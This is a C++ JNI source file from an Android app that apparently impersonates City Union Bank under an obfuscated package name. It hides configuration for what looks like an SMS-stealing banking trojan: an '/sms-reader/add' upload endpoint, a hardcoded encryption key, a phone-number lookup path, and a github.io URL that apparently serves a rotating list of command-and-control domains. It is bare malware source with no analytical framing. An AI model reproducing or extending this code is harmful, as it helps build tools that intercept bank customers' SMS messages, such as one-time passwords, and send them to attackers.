#include <jni.h>
#include <string>

// Declare global variables for the domain URLs
std::string sms_save = "/sms-reader/add";
std::string site = "localhost";
std::string KEY = "001122334455667A8899aabbccddeeff";
std::string getNumber = "/site/number?site=";
std::string domainList = "https://dkb0ss2.github.io/snjau/securityrules.html";

extern "C"
JNIEXPORT jstring JNICALL
Java_com_cityunionbank_ljlkqjahqywlqkwlkjayqwkjlajlskjlajsljasashash_Helper_SMSSavePath(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(sms_save.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_cityunionbank_ljlkqjahqywlqkwlkjayqwkjlajlskjlajsljasashash_Helper_SITE(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(site.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_cityunionbank_ljlkqjahqywlqkwlkjayqwkjlajlskjlajsljasashash_Helper_KEY(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(KEY.c_str());
}


extern "C"
JNIEXPORT jstring JNICALL
Java_com_cityunionbank_ljlkqjahqywlqkwlkjayqwkjlajlskjlajsljasashash_Helper_getNumber(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(getNumber.c_str());
}



extern "C"
JNIEXPORT jstring JNICALL
Java_com_cityunionbank_ljlkqjahqywlqkwlkjayqwkjlajlskjlajsljasashash_Helper_DomainList(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(domainList.c_str());
}
